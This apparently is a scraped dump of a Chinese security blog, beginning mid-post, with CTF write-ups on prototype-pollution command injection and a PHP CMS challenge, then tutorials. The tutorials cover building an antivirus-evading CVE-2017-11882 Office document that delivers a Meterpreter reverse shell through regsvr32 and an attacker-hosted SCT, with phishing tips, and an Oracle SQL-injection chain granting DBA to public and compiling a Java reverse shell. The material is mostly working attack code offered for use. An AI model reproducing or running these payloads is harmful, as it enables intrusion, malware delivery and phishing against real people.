JSON.parse(message); if(message.channel === undefined) { console.log(clientManager.getUsername(client),\"said:\", message.msg); } else { sendMessageToChannel(message.channel, client, message.msg); } } catch(e) { console.log(e); client.disconnect() } }); client.on('disconnect', function () { try { console.log('client disconnect...', client.id) var oldclient = clientManager.removeClient(client); if(oldclient !== undefined) { for (const [channel, state] of Object.entries(oldclient.ch)) { if(!state) continue; sendMessageToChannel(channel, \"Server\", \"User \" + oldclient.u.name + \" left channel\"); } } } catch(e) { console.log(e); client.disconnect() } }) client.on('error', function (err) { console.log('received error from client:', client.id) console.log(err) })});server.listen(3000, function (err) { if (err) throw err; console.log('listening on port 3000');}); &emsp;&emsp;客户端代码:1234567891011121314151617181920212223242526const io = require('socket.io-client')const socket = io.connect('http://192.168.142.128:3000') if(process.argv.length != 4) { console.log('name and channel missing') process.exit()}console.log('Logging as ' + process.argv[2] + ' on ' + process.argv[3])var inputUser = { name: process.argv[2],};socket.on('message', function(msg) { console.log(msg.from,\"[\", msg.channel!==undefined?msg.channel:'Default',\"]\", \"says:\\n\", msg.message);});socket.on('error', function (err) { console.log('received socket error:') console.log(err)})socket.emit('register', JSON.stringify(inputUser);socket.emit('message', JSON.stringify({ msg: \"hello\" }));socket.emit('join', process.argv[3]);//ps: you should keep your channels privatesocket.emit('message', JSON.stringify({ channel: process.argv[3], msg: \"hello channel\" }));socket.emit('message', JSON.stringify({ channel: \"hhhh\", msg: \"i own you\" })); &emsp;&emsp;可以看到整个应用是一个socket.io实现的聊天室。代码看下来并没有发现数据库、flag的配置或定义，但在helper.js里看到一个命令执行的地方：12345678getAscii: function(message) { var e = require('child_process'); console.log(\"\\n******************************\"); var command = \"cowsay '\" + message + \"'\"; console.log(command); console.log(\"******************************\\n\"); return e.execSync(command).toString();} &emsp;&emsp;所以目的就是通过命令执行拿到flag。 &emsp;&emsp;在server.js里我们发现只有两处调用了getAscii()1234567891011121314client.on('join', function(channel) { try { clientManager.joinChannel(client, channel); sendMessageToClient(client,\"Server\", \"You joined channel\", channel) var u = clientManager.getUsername(client); var c = clientManager.getCountry(client); sendMessageToChannel(channel,\"Server\", helper.getAscii(\"User \" + u + \" living in \" + c + \" joined channel\")) } catch(e) { console.log(e); client.disconnect() }}); &emsp;&emsp;看起来我们只需要控制username和country就能命令注入，但继续审计发现，出了name,其他属性，如country, lastname等都不允许出现，而且对name也有严格检查(/^[a-z0-9]+$/gi)，检查代码：12345678910111213141516171819202122232425// helper.js...validUser: function(inp) { var block = [\"source\",\"port\",\"font\",\"country\", \"location\",\"status\",\"lastname\"]; if(typeof inp !== 'object') { return false; } var keys = Object.keys( inp); for(var i = 0; i&lt; keys.length; i++) { key = keys[i]; // 检查属性 if(block.indexOf(key) !== -1) { return false; } } var r =/^[a-z0-9]+$/gi; if(inp.name === undefined || !r.test(inp.name)) { return false; } return true;}, &emsp;&emsp;看起来这里我们也控制不了。 Prototype pollution attack&emsp;&emsp;这里我们需要使用原型污染（Prototype pollution attack）的攻击方法。 &emsp;&emsp;说原型污染前我们先了解一下JS里的原型继承的原理。 当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object ）都有一个私有属性（称之为 proto）指向它的原型对象（prototype）。该原型对象也有一个自己的原型对象 ，层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。 当我们o = new F 创建一个实例o的时候，会给o添加一个proto属性，通过protp会找到 F.prototype,也就是所属类的原型。当我们通过o访问一个属性的时候，比如o.name,会先在实例o上查找，没有的话js会通过proto去类的原型上找，由于原型也是一个对象，它也有proto属性，默认会找到Object的原型。所以，当我们的Child类想通过继承访问Super类上的属性/方法，可以通过设置Child的原型，能访问到Super的原型，就可以访问Super类的公用属性和方法了。 &emsp;&emsp;上面两段是截取网上感觉说得比较好的解释。对于JS的原型链我们可以用c/c++里的继承辅助理解，但不同的是js是单继承的，所以只能形成链状，这不同于C/C++的多继承。 &emsp;&emsp;我们可以通过下面的例子理解一下:123456789101112a = {}{}b = {}{}b[\"__proto__\"]{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}b[\"__proto__\"][\"admin\"] = truetrueb[\"admin\"]truea[\"admin\"]true &emsp;&emsp;可以看到通过修改b[&quot;__proto__&quot;]的属性可以为a增加一个叫admin的属性。这里可以简单的把b[&quot;__proto__&quot;]理解为b(a)的父类，那么通过b[&quot;__proto__&quot;][&quot;admin&quot;] = true为父类增加了一个属性，在使用a[&quot;admin&quot;]的使用首先会从自身的属性里查找admin，如果没有则向上级类查找，从而在父类中得到admin的值。这跟c++的继承原理颇为相似。## exploit&emsp;&emsp;回过头看我们的题目环境，在helper.js里我们发现有个clone函数：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061clone: function(obj) { if (typeof obj !== 'object' || obj === null) { return obj; } var newObj; var cloneDeep = false; if (!Array.isArray(obj)) { if (Buffer.isBuffer(obj)) { newObj = new Buffer(obj); } else if (obj instanceof Date) { newObj = new Date(obj.getTime()); } else if (obj instanceof RegExp) { newObj = new RegExp(obj); } else { var proto = Object.getPrototypeOf(obj); console.log(\"\\n[*] Object.getPrototypeOf(obj) = \" + JSON.stringify(proto) + \"\\n\") if (proto &amp;&amp; proto.isImmutable) { newObj = obj; } else { newObj = Object.create(proto); cloneDeep = true; } } } else { newObj = []; cloneDeep = true; } if (cloneDeep) { var keys = Object.getOwnPropertyNames(obj); for (var i = 0; i &lt; keys.length; ++i) { var key = keys[i]; var descriptor = Object.getOwnPropertyDescriptor(obj, key); if (descriptor &amp;&amp; (descriptor.get || descriptor.set)) { Object.defineProperty(newObj, key, descriptor); } else { newObj[key] = this.clone(obj[key]); } } } return newObj;},&emsp;&emsp;他会对传入的对象取出key，value，然后clone出一个新的object返回。根据代码，它实行的是深度拷贝(deep clone)，使用了for循环（keys.length）将所以的属性都拷贝一次（递归拷贝）。&emsp;&emsp;所以我们可以尝试污染掉inputUser = {...}的上级父类(proto)。&emsp;&emsp;题目中是newUser = helper.clone(JSON.parse(inUser))这样调用clone的，而JSON.parse跟__proto__会产生危险的反应，先上个例子：1234567891011121314151617181920&gt;const plainObj = { __proto__: { a: 1 }, b: 2};&lt;undefined&gt;plainObj&lt;{b: 2}&gt;plainObj.__proto__&lt;{a: 1}&gt;const jsonString = `{ \"__proto__\": { \"a\": 1 }, \"b\": 2}`;&lt;undefined&gt;const parsedObj = JSON.parse(jsonString);&lt;undefined&gt;parsedObj&lt;{b: 2}&gt;parsedObj.__proto__&lt;{a: 1} &emsp;&emsp;可以看出JSON.parse的时候把proto当成了属性处理，并没有过滤这个属性。所以我们可以构造如下的poc:12inputUser = `{\"name\": \"admin\", \"__proto__\": {\"country\": \"'$(ls)'\"}}`;socket.emit('register', inputUser);&emsp;&emsp;这里我们注意在$(ls)两端要加上'，使之得到命令（字符串）拼接的效果。1cowsay 'User admin living in '$(ls)' joined channel'&emsp;&emsp;当我们发送过去后即可得到ls的结果： &emsp;&emsp;这里注意我们需要直接使用字符串，而不是构造好{}，再用JSON.stringify()得到字符串，因为在stringify的时候会忽略__proto__。如：12345678var inputUser = { name: process.argv[2], __proto__: '{\"country\": \"\\'$(ls)\\'\"}'};console.log(\"JSON.stringify(inputUser) = \" + JSON.stringify(inputUser));socket.emit('register', JSON.stringify(inputUser));socket.emit('message', JSON.stringify({ msg: \"hello\" }));socket.emit('join', process.argv[3]);//ps: you should keep your channels private &emsp;&emsp;结果如下： &emsp;&emsp;所以我们直接使用cat falg。 参考链接&emsp;&emsp;https://rawsec.ml/en/DefCamp-2018-Quals-write-ups/#211-chat-web &emsp;&emsp;https://xz.aliyun.com/t/2735 &emsp;&emsp;https://github.com/sunyongjian/blog/issues/23 &emsp;&emsp;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain &emsp;&emsp;https://medium.com/intrinsic/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/09/defcamp-dctf-2018-writeup/"},{"title":"N1CTF funning eating cms writeup","text":"前言&emsp;&emsp;这道题get到点时已经太晚了，比赛期间的进度也可以算是达到了80%，略微遗憾。 &emsp;&emsp;打开题目的链接，发现只有login登陆表，尝试访问register.php，返回注册页面，先注册一个账号。用注册的账号登陆后发现是如下页面。 &emsp;&emsp;开始猜测是文件包含漏洞，一开始是尝试读取index.php的源码，但发现没有返回数据。 &emsp;&emsp;然后尝试只读index，发现这才是正确的打开方式:) &emsp;&emsp;解密后的代码如下：123456789&lt;?phprequire_once \"function.php\";if(isset($_SESSION['login'] )){ Header(\"Location: user.php?page=info\");}else{ include \"templates/index.html\";}?&gt; &emsp;&emsp;用类似的办法将其他文件给读出来。info.php123456&lt;?phpif (FLAG_SIG != 1){ die(\"you can not visit it directly \");}include \"templates/info.html\";?&gt; info.php123456&lt;?phpif (FLAG_SIG != 1){ die(\"you can not visit it directly \");}include \"templates/guest.html\";?&gt; login.php12345678910111213141516171819202122&lt;?phprequire_once \"function.php\";if($_POST['action'] === 'login'){ if (isset($_POST['username']) and isset($_POST['password'])){ $user = $_POST['username']; $pass = $_POST['password']; $res = login($user,$pass); if(!$res){ Header(\"Location: index.php\"); }else{ Header(\"Location: user.php?page=info\"); } } else{ Header(\"Location: error_parameter.php\"); }}else if($_REQUEST['action'] === 'logout'){ logout();}else{ Header(\"Location: error_parameter.php\");}?&gt; register.php1234567891011121314151617181920212223&lt;?phprequire_once \"function.php\";if($_POST['action'] === 'register'){ if (isset($_POST['username']) and isset($_POST['password'])){ $user = $_POST['username']; $pass = $_POST['password']; $res = register($user,$pass); if($res){ Header(\"Location: index.php\"); }else{ $errmsg = \"Username has been registered!\"; } } else{ Header(\"Location: error_parameter.php\"); }}if (!$_SESSION['login']) { include \"templates/register.html\";} else { Header(\"Location : user.php?page=info\");}?&gt; function.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;?phpsession_start();require_once \"config.php\";function Hacker(){ Header(\"Location: hacker.php\"); die();}function filter_directory(){ $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"]; $uri = parse_url($_SERVER[\"REQUEST_URI\"]); parse_str($uri['query'], $query);// var_dump($query);// die(); foreach($keywords as $token) { foreach($query as $k =&gt; $v) { if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); } }}function filter_directory_guest(){ $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"]; $uri = parse_url($_SERVER[\"REQUEST_URI\"]); parse_str($uri['query'], $query);// var_dump($query);// die(); foreach($keywords as $token) { foreach($query as $k =&gt; $v) { if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); } }}function Filter($string){ global $mysqli; $blacklist = \"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\"; $whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+&gt;&lt;\"; for ($i = 0; $i &lt; strlen($string); $i++) { if (strpos(\"$whitelist\", $string[$i]) === false) { Hacker(); } } if (preg_match(\"/$blacklist/is\", $string)) { Hacker(); } if (is_string($string)) { return $mysqli-&gt;real_escape_string($string); } else { return \"\"; }}function sql_query($sql_query){ global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;}function login($user, $pass){ $user = Filter($user); $pass = md5($pass); $sql = \"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'\"; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) { $data = $res-&gt;fetch_array(); $_SESSION['user'] = $data[username_which_you_do_not_know]; $_SESSION['login'] = 1; $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too]; return true; } else { return false; } return;}function updateadmin($level,$user){ $user = Filter($user); $sql = \"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' \"; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) { return true; } else { return false; } return;}function register($user, $pass){ global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = \"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')\"; $res = sql_query($sql); return $mysqli-&gt;insert_id;}function logout(){ session_destroy(); Header(\"Location: index.php\");}?&gt; config.php123456789101112131415161718&lt;?phperror_reporting(E_ERROR | E_WARNING | E_PARSE);define(BASEDIR, \"/var/www/html/\");define(FLAG_SIG, 1);$OPERATE = array('userinfo','upload','search');$OPERATE_admin = array('userinfo','upload','search','manage');$DBHOST = \"localhost\";$DBUSER = \"root\";$DBPASS = \"Nu1LCTF2018!@#qwe\";//$DBPASS = \"\";$DBNAME = \"N1CTF\";$mysqli = @new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);if(mysqli_connect_errno()){ echo \"no sql connection\".mysqli_connect_error(); $mysqli=null; die();}?&gt; user.php12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once(\"function.php\");if( !isset( $_SESSION['user'] )){ Header(\"Location: index.php\");}if($_SESSION['isadmin'] === '1'){ $oper_you_can_do = $OPERATE_admin;}else{ $oper_you_can_do = $OPERATE;}//die($_SESSION['isadmin']);if($_SESSION['isadmin'] === '1'){ if(!isset($_GET['page']) || $_GET['page'] === ''){ $page = 'info'; }else { $page = $_GET['page']; }}else{ if(!isset($_GET['page'])|| $_GET['page'] === ''){ $page = 'guest'; }else { $page = $_GET['page']; if($page === 'info') {// echo(\"&lt;script&gt;alert('no premission to visit info, only admin can, you are guest')&lt;/script&gt;\"); Header(\"Location: user.php?page=guest\"); } }}filter_directory();//if(!in_array($page,$oper_you_can_do)){// $page = 'info';//}include \"$page.php\";?&gt; &emsp;&emsp;以上就是一开始能读到的源码。想试图尝试读取flag、ffffllllaaaaggg，但发现有过滤，会被重定向到hacker。然后在用zap抓包的时候发现了hint。 &emsp;&emsp;但由于过滤的原因，无法访问此文件，但这个hint也为我们指明了方向，接下来尝试了一下敏感目录扫描，然后就发现了.viminfo泄露。 123456&lt;?phpif (FLAG_SIG != 1){ die(\"you can not visit it directly \");}include \"templates/update.html\";?&gt; &emsp;&emsp;尝试访问了一下： &emsp;&emsp;再去读取updateadmin233333333333333.php的源码，发现跟updateadmin.php的源码相同。 &emsp;&emsp;然后自己当时想到的点就是： 1、绕过isadmin验证 2、绕过filter_directory()过滤 &emsp;&emsp;先尝试的进行register注册账号时进行注入，致使isadmin置为1，尝试构造了的payload：hahaha','123','1')-- +，但是可以看到有白名单限制，它过滤了空格，所以这个猜想看起来行不通。 &emsp;&emsp;再进行filter_directory绕过时自己没有看出tips，看出来估计这里就不用停那么久了。。。后来逼得没办法了，就将它里面的关键代码拿去google了一下，这下还真有发现。 &emsp;&emsp;打开后就找到了payload： 这里用到了 parse_url 函数在解析 url 时存在的 bug，通过：////x.php?key=value 的方式可以使其返回 False。 &emsp;&emsp;拿着这个payload，发现果真有用。 &emsp;&emsp;读它的源码：1234567&lt;?phpif (FLAG_SIG != 1){ die(\"you can not visit it directly\");}include \"templates/upload2323233333.html\";?&gt; &emsp;&emsp;发现并没有什么有用的信息，接着访问一下。 &emsp;&emsp;在读upllloadddd.php的源码：1234567891011121314151617181920212223242526&lt;?php$allowtype = array(\"gif\",\"png\",\"jpg\");$size = 10000000;$path = \"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\";$filename = $_FILES['file']['name'];if(is_uploaded_file($_FILES['file']['tmp_name'])){ if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){ die(\"error:can not move\"); }}else{ die(\"error:not an upload file！\");}$newfile = $path.$filename;echo \"file upload success&lt;br /&gt;\";echo $filename;$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");echo \"&lt;img src='data:image/png;base64,\".$picdata.\"'&gt;&lt;/img&gt;\";if($_FILES['file']['error']&gt;0){ unlink($newfile); die(\"Upload file error: \");}$ext = array_pop(explode(\".\",$_FILES['file']['name']));if(!in_array($ext,$allowtype)){ unlink($newfile);}?&gt; &emsp;&emsp;将关键部分的代码Google一下，然后又发现了几乎一样的源码。。。 &emsp;&emsp;他这里的payload是： &emsp;&emsp;由于找到此篇文章的时候已经比赛结束了，，拿着它提供的脚本跑了一会却没有按他说预言的生成php文件，所以就从ctftime上找了一篇writeup照着复现一下。 &emsp;&emsp;因为他执行的是system()函数，所以这里可以造成任意代码执行漏洞。 &emsp;&emsp;再查看上一级目录： &emsp;&emsp;读取这个文件，发现直接cat ../flag_233333不行，/被过滤掉了，不过我们可以cd ..再读。 &emsp;&emsp;至此，成功拿到flag。这道题自己学到了很多，也意识到了自己的经验还是不足，以后必将勤加练习，当然还是要留意细节跟善用搜索引擎。。。 &emsp;&emsp;希望能在这条路上走远一点:) 参考链接[]N1CTF 2018 - Funning eating cms[]Web中的条件竞争漏洞[]GeekPwn2016跨次元CTF Writeup[]web","link":"/2018/03/n1ctf-funning-eating-cms/"},{"title":"Office CVE-2017-11882实战免杀","text":"放在前面&emsp;这里真的要感谢@余弦在懒人在思考的公众号里发过的关于MSF免杀payload的推文，正是看着这篇文章，再联想到最近火热的office cve-2017-11882，才成功的构造了绕过电脑管家和360的免杀的利用脚本。因为云服务器处于生产环境，并对外提供正经服务，所以只能以局域网环境“实战”。 介绍&emsp;因为关于office 11882的复现及利用都是使用mshta，这个利用方法已经被各杀软重点关注了，所以被拦截的概率会很大，上一篇复现时，连电脑管家都拦截提示了！！所以一个免杀的方法就是使用别的利用工具，而弦哥的这个推文刚好被我从公众号里搜索到，其实很多时候，我们虽然在众里寻他千百度，但很多人却没有“蓦然回首”。关注了这个漏洞的利用脚本的人都知道关键点是可注入的字符越长越好，方便利用，如果要换利用方式的话，替换注入字符就行，而这篇文章也是利用了这一点。 目录 一：生成payload 二：创建C#工程文件 三：将生成的exe转换成js 四：结合web server 五：office上场 六：关于钓鱼 一：生成payload&emsp;使用msfvenom生成C#的payload 1msfvenom -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b \"\\x00\\xff\" LHOST=192.168.1.231 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe &emsp;虽然在弦哥的推文中说不用解释选线意义，但出于学习，我还是记录一下：参数说明：-p：选择载荷模块；-a：系统架构（几位）；-f：生成文件的格式；-b：设定规避字符集； PrependMigrate 和 PrependMigrateProc是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。 二：创建C#工程文件&emsp;这里我使用vs2015，我这里.Net Framework本来是没有2.0的，是自己装的，vs2013就有。创建的新项目如下图： &emsp;将如下代码黏贴覆盖到 Program.cs 中：123456789101112131415161718192021222324252627282930using System;using System.Threading;using System.Runtime.InteropServices;namespace MSFWrapper{ public class Program { public Program() { RunMSF(); } public static void RunMSF() { byte[] MsfPayload = { //Paste your Payload here }; IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40); Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length); CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0); Thread.Sleep(2000); } public static void Main() { } [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); }} &emsp;然后将先前生成的 Payload 的黏贴到代码中注释为“//Paste your Payload here”的地方。这里注意只需要复制那些0x开头的字符，而不需要整个复制下来粘贴。保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”, 然后保存。如下图： &emsp;在Release 版中添加对X86的支持，然后编译出来，可以得到一个（项目名.exe） 三：将生成的exe转换成js&emsp;这里我们使用DotNetToJScript ，这是一款可以将 .net 程序转换为 jscript 代码的工具，下载地址：DotNetToJScript。下载好后进入项目文件夹，运行下面的命令：1E:\\tools\\DotNetToJScript&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program 86.exe &emsp;这里的86.exe是上面编译生成的文件。运行后可以得到MSFWrapper.js，接下来我们用msf开始监听，这里不细说，直接贴图： 然后我们就可以用下面的命令执行我们的 MSF Payload：1C:\\windows\\SysWOW64\\cscript.exe MSFWrapper.js 运行后，电脑管家跟360跟啥事都没发生过一样。。。。而我们已经Get Shell了 &emsp;到了这里，我们已经可以基本确定弦哥的方法是可行的了。因为要跟office 结合起来，所以我们还需要继续。 四：结合web server&emsp;本地bypass是不够的，我们需要结合web server扩大影响。既然能够转换为 js 代码，那么我们自然会想到 sct。我们将转换后的 js 代码黏贴到下面代码中的“//paste code here”：12345678910&lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;Msf&quot; classid=&quot;{F0001111-0000-0000-0000-0000FEEDACDC}&quot; &gt; &lt;script language=&quot;JScript&quot;&gt; //paste code here &lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; &emsp;保存为 msf.sct（后缀名可以更改，比如 jpg 等），这里注意，第一行一定要放在文件的第一行（第一行不能为空或其他），不然会出错，然后上传至 Web Server。 五：office上场&emsp;我们需要注入：1regsvr32 /s /u /n /i:http://192.168.1.231/msf.sct c:\\windows\\SysWOW64\\scrobj.dll &emsp;才80个字节，现在的exp已经支持109字节了，所以，我们可以顺利的注入进去。这里我使用https://github.com/Ridter/CVE-2017-11882。命令如下：1root@Kali:~/hackhub/CVE-2017-11882# python Command109b_CVE-2017-11882.py -c \"regsvr32 /s /u /n /i:http://192.168.1.231/msf.sct c:\\windows\\SysWOW64\\scrobj.dll\" -o hello.doc &emsp;这里需要注意我们使用109b的脚本，不要使用43B的。&emsp;PS：最厉害的exp已经支持605字节，已经很厉害了！！附上项目地址 。这样一来姿势又多了。 &emsp;把生成的文件发送给靶机，并打开该doc。 可以看到，我们又接收到一个shell，而且注意到电脑管家是全程静默的，没有任何提示及报毒。 &emsp;接下来，我关掉电脑管家，启用360.。 &emsp;可见360的预防效果还是强于电脑管家，但如果用户点击允许运行的话，360也不能阻止恶意的网络连接，最终还是能get shell的。 &emsp;这里再安利一下卡巴斯基，老毛子的杀软，像这样的文件，老毛子会告诉你什么是残酷，我把文件从虚拟机复制出来。 能活过1秒算我输。。。。 六：关于钓鱼 &emsp;这模板是不是很有诱惑~ 哈哈&emsp;画风就变成这样：同学同学，我的实验报告写完了，你要。。。不。。。要。。。借鉴一下？？（手动给个滑稽）","link":"/2017/11/office-2017-11882-bypass/"},{"title":"Oracle 从sqli到get (root) shell","text":"前言&emsp;&emsp;本文记录一下oracle从SQLi到get (root) shell的过程。首发于T00ls。&emsp;&emsp;首先我们需要一个oracle的一个注入点，oracle一般被用于大型企业或组织的数据库，所以它里面的权限划分、表间关系就变得尤其复杂，有时候即使能注出用户表也会存在password列做了视图或多表联合，导致拿不到真实的password。所以我们有必要对oracle数据库的信息做探测，我们可以通过sqlmap提供的自定义SQL语句执行这个功能探测一下用户权限、视图等信息，这里使用--sql-query：1234--sql-query=QUERY SQL statement to be executedExample:sqlmap -u \"http://www.xxxx.com/index.php?ID=111\" --sql-query \"select username from users\" Oracle相关权限session_privs&emsp;&emsp;oracle中我们可以通过查询session_privs表得到当前用户的权限，如：123456789101112131415161718192021-- sqlmap outputselect PRIVILEGE from session_privs [19]:[*] ADMINISTER DATABASE TRIGGER[*] ALTER ANY INDEX[*] ALTER ANY TABLE[*] CREATE ANY INDEX[*] CREATE ANY VIEW[*] CREATE CLUSTER[*] CREATE INDEXTYPE[*] CREATE OPERATOR[*] CREATE PROCEDURE[*] CREATE SEQUENCE[*] CREATE SESSION[*] CREATE TABLE[*] CREATE TRIGGER[*] CREATE TYPE[*] DELETE ANY TABLE[*] DROP ANY INDEX[*] INSERT ANY TABLE[*] SELECT ANY TABLE[*] UNLIMITED TABLESPACE &emsp;&emsp;这里我们重点注意这个UNLIMITED TABLESPACE权限，这个权限很高，高到可以满足我们后面执行java代码，导致任意代码执行、反弹shell。123unlimited tablespace是隐含在dba, resource角色中的一个系统权限一般DBA要把这个 UNLIMITED TABLESPACE权限关掉 USER_CONSTRAINTS&emsp;&emsp;引用docs.oracle:1USER_CONSTRAINTS describes all constraint definitions on tables owned by the current user. Its columns are the same as those in &quot;ALL_CONSTRAINTS&quot;. &emsp;&emsp;USER_CONSTRAINTS存放了当前用户表的所有约束定义。所以我们可以通过这个查看当前用户表里是否存在对password的约束：12345select constraint_name, constraint_type, table_name,index_name,search_condition, r_constraint_name from user_constraints where table_name = upper('YHB')[*] SYS_C007280, C, YHB, , None, [*] SYS_C007281, C, YHB, , None, [*] SYS_C007282, P, YHB, SYS_C000082, None, &emsp;&emsp;可以看到当前表下有三个约束条件。 user_cons_columns USER_CONS_COLUMNS describes columns that are owned by the current user and that are specified in constraint definitions. Its columns are the same as those in “ALL_CONS_COLUMNS”. &emsp;&emsp;查到约束名称后我们可以通过user_cons_columns查看当前用户拥有且在约束定义中指定的列。也就是得到约束作用的列（字段）。如：1234select ower,table_name,column_name from user_cons_columns where constraint_name='SYS_C000280'[*] PASSWORD[*] YHB &emsp;&emsp;这里明显看到有一个对password的约束，当你在dump用户表的时候如果发现password是none或者null，那么就有可能是因为约束的原因。 user_views USER_VIEWS describes the views owned by the current user. Its columns (except for OWNER) are the same as those in ALL_VIEWS. &emsp;&emsp;user_views描述了当前用户拥有的视图。视图是oracle的一个重要组成部分，它使复杂查询SQL变得简单有效。1234create or replace view v_complexasselect table1.ename, table1.job, table2.dname from table1, dept where table1.deptno=table2.deptnowith check option ; &emsp;&emsp;如上就把两个table做了一个联合查询的视图，具体的可以另寻参考。 &emsp;&emsp;在渗透中我们可以使用如下进行查询：12select VIEW_NAME,TEXT_LENGTH,TEXT from user_views [224]:-- 省略 Java代码执行&emsp;&emsp;在得到目标的基本信息后我们可以利用oracle对Java的支持进行Java代码执行。 &emsp;&emsp;前面说了UNLIMITED TABLESPACE可以满足我们代码执行的条件。如果权限不够的话可以通过下面的语句进行提权：1' and (SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS _OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0)) is not null-- &emsp;&emsp;执行后可能会报这个错误：12345服务器无法处理请求。 --&amp;gt; ORA-06550: line 1, column 7:PLS-00201: identifier &apos;SYS.DBMS _OUTPUT&apos; must be declaredORA-06550: line 1, column 7:PL/SQL: Statement ignoredORA-06512: at &quot;SYS.DBMS_EXPORT_EXTENSION&quot;, line 360 &emsp;&emsp;但在这个例子中并不会影响到我的操作，如果需要解决这个错误可以Google一下。 &emsp;&emsp;接着使用java 反弹shell。 创建Java反弹代码1' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"shell\" as import java.io.*;import java.net.*;public class shell{public static void run() throws Exception {Socket s = new Socket(\"{your_ip}\", {your_port});Process p = Runtime.getRuntime().exec(\"C:/Windows/System32/cmd.exe\");new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();}static class T extends Thread {private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) {this.u = out;this.i = in;}public void run() {BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try {while ((l = n.read(f, 0, f.length)) &gt; 0) {w.write(f, 0, l);w.flush();}} catch (IOException e) {}try {if (n != null)n.close();if (w != null)w.close();} catch (Exception e) {}}}}'''';END;'';END;--','SYS',0,'1',0) from dual) is not null-- &emsp;&emsp;格式化代码后就是如下语句：1234567891011121314151617181920212223242526272829303132333435import java.io.*;import java.net.*;public class shell { public static void run() throws Exception { Socket s = new Socket(\"{your_ip}\", {your_port}); Process p = Runtime.getRuntime().exec(\"C:/Windows/System32/cmd.exe\"); new T(p.getInputStream(), s.getOutputStream()).start(); new T(p.getErrorStream(), s.getOutputStream()).start(); new T(s.getInputStream(), p.getOutputStream()).start(); } static class T extends Thread { private InputStream i; private OutputStream u; public T(InputStream in , OutputStream out) { this.u = out; this.i = in ; } public void run() { BufferedReader n = new BufferedReader(new InputStreamReader(i)); BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u)); char f[] = new char[8192]; int l; try { while ((l = n.read(f, 0, f.length)) &gt; 0) { w.write(f, 0, l); w.flush(); } } catch (IOException e) {} try { if (n != null) n.close(); if (w != null) w.close(); } catch (Exception e) {} } }} 